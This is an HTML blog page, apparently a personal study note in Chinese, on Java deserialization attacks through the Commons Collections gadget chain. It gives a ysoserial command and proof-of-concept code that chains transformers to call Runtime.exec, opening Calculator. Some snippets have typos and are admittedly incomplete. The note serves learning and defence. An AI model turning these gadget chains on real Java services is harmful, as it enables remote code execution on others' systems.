@@ -1,0 +1,230 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Java安全学习笔记——反序列化使用方法很简单：java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1(你想利用的反序列化链),"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle"></h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title"></h1>
+        <div class="stuff">
+            <span>二月 18, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Java安全学习笔记——反序列化"><a href="#Java安全学习笔记——反序列化" class="headerlink" title="Java安全学习笔记——反序列化"></a>Java安全学习笔记——反序列化</h1><p>使用方法很简单：<code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1(你想利用的反序列化链) &quot;id&quot;</code></p>
+<p>列化已经是很热门的话题了，不仅是java，php、python也是比较经典的反序列化语言了</p>
+<p>不管是 什么语言，什么框架一旦涉及到了反序列化，往往就伴随着一些安全隐患</p>
+<p>java中的<code>wirteObject</code>允许我们在序列化流中插入一些自定义的数据，在反序列化的时候能用<code>readObject</code>读取。所以java的反序列化主要是由这两函数引起的</p>
+<p>java中有一个类:<code>ObjectOutputStream</code>，这个类中有一个方法:<code>annotateVClass</code>,这个类的子类想序列化后的数据里放内容的时候就需要重写这个方法，在反序列化的时候可以读取这个数据</p>
+<p>java反序列化必须要知道的一个链就是<code>CommonCollections</code>网上的教程有很多，这里我就简单的说一下几个关键点</p>
+<h4 id="TransformedMap-对java的标准数据结构Map做一个修饰"><a href="#TransformedMap-对java的标准数据结构Map做一个修饰" class="headerlink" title="TransformedMap:对java的标准数据结构Map做一个修饰"></a><code>TransformedMap</code>:对java的标准数据结构Map做一个修饰</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MapouterMap&#x3D;TransformedMap.decorate(innerMap,</span><br><span class="line">keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>
+
+<p>其中的后面两个参数是实现了<code>Transformer</code>接口的类,是处理新元素<code>keyTransformer</code>和<code>valueTransformer</code>的回调</p>
+<h4 id="Transformer-一个只有一个方法的接口"><a href="#Transformer-一个只有一个方法的接口" class="headerlink" title="Transformer:一个只有一个方法的接口"></a><code>Transformer</code>:一个只有一个方法的接口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line">public Object transform(Object input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>TransformedMap</code>在转换Map新元素的时候，就会调用<code>tansforme</code>方法。</p>
+<h4 id="ConstaTransformer：是一个实现了Tanaformer接口的一个类，它在构造函数的时候传入一个对象，并在transform方法将这个对象再返回他的作用就是包装一个对象，然后再返回这个对象"><a href="#ConstaTransformer：是一个实现了Tanaformer接口的一个类，它在构造函数的时候传入一个对象，并在transform方法将这个对象再返回他的作用就是包装一个对象，然后再返回这个对象" class="headerlink" title="ConstaTransformer：是一个实现了Tanaformer接口的一个类，它在构造函数的时候传入一个对象，并在transform方法将这个对象再返回他的作用就是包装一个对象，然后再返回这个对象"></a><code>ConstaTransformer</code>：是一个实现了<code>Tanaformer</code>接口的一个类，它在构造函数的时候传入一个对象，并在transform方法将这个对象再返回他的作用就是包装一个对象，然后再返回这个对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">super();</span><br><span class="line">iConstant &#x3D; constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">return iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="InvokerTansformer-也是实现了Transformer接口的一个类，这个类可以用来执行任意方法，这个是反序列化能够执行任意代码的关键类"><a href="#InvokerTansformer-也是实现了Transformer接口的一个类，这个类可以用来执行任意方法，这个是反序列化能够执行任意代码的关键类" class="headerlink" title="InvokerTansformer:也是实现了Transformer接口的一个类，这个类可以用来执行任意方法，这个是反序列化能够执行任意代码的关键类"></a><code>InvokerTansformer</code>:也是实现了Transformer接口的一个类，这个类可以用来执行任意方法，这个是反序列化能够执行任意代码的关键类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[]</span><br><span class="line">args) &#123;</span><br><span class="line">super();</span><br><span class="line">iMethodName &#x3D; methodName;</span><br><span class="line">iParamTypes &#x3D; paramTypes;</span><br><span class="line">iArgs &#x3D; args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表(你希望这个函数执行的内容):<br>后面再回调的tansform方法，就是执行了input对象的iMethodName方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">if (input &#x3D;&#x3D; null) &#123;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">try &#123;</span><br><span class="line">Class cls &#x3D; input.getClass();</span><br><span class="line">Method method &#x3D; cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">return method.invoke(input, iArgs);</span><br><span class="line">&#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; +</span><br><span class="line">iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);</span><br><span class="line">&#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; +</span><br><span class="line">iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);</span><br><span class="line">&#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; +</span><br><span class="line">iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ChainedTransformer：也是实现了Transformer接口的一个类，作用是把内部的所有Transformer串在一起有点像是C语言的递归"><a href="#ChainedTransformer：也是实现了Transformer接口的一个类，作用是把内部的所有Transformer串在一起有点像是C语言的递归" class="headerlink" title="ChainedTransformer：也是实现了Transformer接口的一个类，作用是把内部的所有Transformer串在一起有点像是C语言的递归"></a><code>ChainedTransformer</code>：也是实现了Transformer接口的一个类，作用是把内部的所有Transformer串在一起有点像是C语言的递归</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">super();</span><br><span class="line">iTransformers &#x3D; transformers;</span><br><span class="line">&#125;</span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">for (int i &#x3D; 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">object &#x3D; iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line">return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="AnnotationInvocationHandler-这个类不同的版本有一些不同"><a href="#AnnotationInvocationHandler-这个类不同的版本有一些不同" class="headerlink" title="AnnotationInvocationHandler:这个类不同的版本有一些不同"></a>AnnotationInvocationHandler:这个类不同的版本有一些不同</h4><p>8u71以前：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">s.defaultReadObject();</span><br><span class="line">&#x2F;&#x2F; Check to make sure that types have not evolved incompatibly</span><br><span class="line">AnnotationType annotationType &#x3D; null;</span><br><span class="line">try &#123;</span><br><span class="line">annotationType &#x3D; AnnotationType.getInstance(type);</span><br><span class="line">&#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">&#x2F;&#x2F; Class is no longer an annotation type; time to punch out</span><br><span class="line">throw new java.io.InvalidObjectException(&quot;Non-annotation type in</span><br><span class="line">annotation serial stream&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();</span><br><span class="line">&#x2F;&#x2F; If there are annotation members without values, that</span><br><span class="line">&#x2F;&#x2F; situation is handled by the invoke method.</span><br><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue :</span><br><span class="line">memberValues.entrySet()) &#123;</span><br><span class="line">String name &#x3D; memberValue.getKey();</span><br><span class="line">Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);</span><br><span class="line">if (memberType !&#x3D; null) &#123; &#x2F;&#x2F; i.e. member still exists</span><br><span class="line">Object value &#x3D; memberValue.getValue();</span><br><span class="line">if (!(memberType.isInstance(value) ||</span><br><span class="line">value instanceof ExceptionProxy)) &#123;</span><br><span class="line">memberValue.setValue(</span><br><span class="line">new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">annotationType.members().get(name)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的重点是这两个</p>
+<p><code>Map.Entry&lt;String, Object&gt; memberValue :memberValues.entrySet()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memberValue.setValue(</span><br><span class="line">new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>
+
+<p>利用一个for循环遍历了我们所有的反序列化后的Map,并且以此设置值，再调用<code>setValue</code>的时候就会触发<code>TransformedMap</code>里面注册的<code>Transform</code>,来执行设计的代码</p>
+<p>所以我们再构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>，并将我们构造的一个内容写进去</p>
+<p>假如我们构造了一个打开计算器的<code>outerMap</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,</span><br><span class="line">new Object[]</span><br><span class="line">&#123;&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain &#x3D; new</span><br><span class="line">ChainedTransformer(transformers);</span><br><span class="line">Map innerMap &#x3D; new HashMap();</span><br><span class="line">Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,</span><br><span class="line">transformerChain);</span><br><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后把这个写到<code>AnnotationInvocationHandler</code>(上面说到的反序列化需要添加内容的时候要改的类):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D;</span><br><span class="line">Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(true);</span><br><span class="line">Object obj &#x3D; construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>
+
+<p>然后生成序列化流</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure>
+
+<p>这个代码是不能运行的，只是一个思路。</p>
+<p>java能序列化的对象必须都实现了java.io.Serializable接口</p>
+<p>所以需要用反射来获得Runtime对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">Class[].class &#125;, new</span><br><span class="line">Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">new Class[0] &#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">Object[].class &#125;, new</span><br><span class="line">Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">new String[] &#123;</span><br><span class="line">&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot; &#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>再8u71版本以后它会再新建一个<code>LinkedHashMap</code>，所以不管我们再怎么折腾，最终处理的都是一个新的对象</p>
+<p>大概有了一个流程了解之后就可以了解一下<code>CommonCollections1</code>的利用了</p>
+<p>这玩意儿的利用链需要用到lazyMap</p>
+<p>这条链子不能直接使用<code>sun.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>方法，他要用的是里面的invoke方法</p>
+<p>上面的代码就换成<code>LazyMap</code>去修饰</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap &#x3D; LazyMap.decorate(innerMap, 1 transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>然后要对<code>sun.reflection.annotation.AnnotationInvocationhandler</code>进行代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ass clazz &#x3D;</span><br><span class="line">Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(true);</span><br><span class="line">InvocationHandler handler &#x3D; (InvocationHandler)</span><br><span class="line">construct.newInstance(Retention.class, outerMap);</span><br><span class="line">Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new</span><br><span class="line">Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+
+<p>我们再把入口点改到<code>AnnotationInvocationHandler</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,</span><br><span class="line">proxyMap);</span><br></pre></td></tr></table></figure>
+
+<p>学不动了</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
